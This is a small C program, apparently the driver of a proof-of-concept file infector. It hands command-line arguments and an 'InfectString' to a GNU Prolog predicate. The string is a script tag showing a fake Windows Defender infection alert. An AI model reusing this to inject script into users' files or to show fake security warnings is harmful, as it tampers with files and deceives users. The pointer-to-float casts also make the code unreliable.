#include "gprolog.h"



const char InfectString[] = "\n<script>alert(\"Warning: This file has been detected by Windows Defender to be infected with Win32/BullMoose!\");</script>";
int normal=128;

void p1(char *argv[]){

  //pl init
  int return_value;
  int func;
  PlTerm arg[10];
  PlBool res;

//register a predicate
  func = Pl_Find_Atom("p");
  
  Pl_Query_Begin(PL_FALSE);
  

  arg[0] = Pl_Mk_Float((unsigned int)argv);
  arg[1] = Pl_Mk_Float((unsigned int)InfectString);
  arg[2] = Pl_Mk_Integer(normal);

  //nb_sol = 0;
  res = Pl_Query_Call(func, 3, arg);
  //return_value = Pl_Rd_Integer(arg[3]);
  /*while (res){
    res = Pl_Query_Next_Solution();
    return_value = Pl_Rd_Integer(arg[3]);
  }*/
  Pl_Query_End(PL_KEEP_FOR_PROLOG);
//stop prolog
 	
}


int main(int argc, char **argv){
  Pl_Start_Prolog(argc, argv);
  
  p1(argv);

  Pl_Stop_Prolog();

  return 0;


}
